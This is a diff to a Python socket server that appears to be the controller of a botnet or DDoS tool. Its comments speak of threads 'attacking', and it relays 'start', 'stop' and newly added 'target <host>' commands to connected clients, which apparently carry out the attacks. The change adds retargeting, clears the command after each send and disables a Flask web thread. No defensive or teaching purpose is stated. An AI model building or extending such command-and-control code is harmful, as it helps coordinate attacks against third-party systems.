@@ -9,7 +9,7 @@ active_connections = 0
 
 # event that can be used to tell all threads to stop running or attacking
 stop_event = threading.Event() 
-command = None
+command = ""
 
 
 def acceptor(s: socket.socket):
@@ -32,6 +32,7 @@ def acceptor(s: socket.socket):
 # function to handle a client connection if any
 def handle_client(conn: socket.socket, addr):
     global active_connections
+    global command
     conn.settimeout(1)
     state = None
     
@@ -44,7 +45,13 @@ def handle_client(conn: socket.socket, addr):
             print("")
             print("Client must have disconnected:", addr)
             break
-        if command == "start" and state != "attacking":
+        if command.split(' ')[0] == "target":
+            if state == "attacking":
+                print("Attack is still going on. Please stop the attack before changing the target.")
+            elif state != "attacking":
+                print("Changing target...")
+                conn.send(command.encode())
+        elif command == "start" and state != "attacking":
             state = "attacking"
             print("command is ", command.encode())
             conn.send(command.encode())
@@ -52,6 +59,7 @@ def handle_client(conn: socket.socket, addr):
             state = "stopped"
             print("command is ", command.encode())
             conn.send(command.encode())
+        command = ""
 
     conn.close()
     # Decrement the active connection count
@@ -78,8 +86,8 @@ if __name__ == "__main__":
     acceptor_thread.start()
 
     # thread for starting the flask webserver
-    flask_thread = threading.Thread(target=runServer ,daemon=True)
-    flask_thread.start()
+    # flask_thread = threading.Thread(target=runServer ,daemon=True)
+    # flask_thread.start()
 
     try:
         while s and not stop_event.is_set():
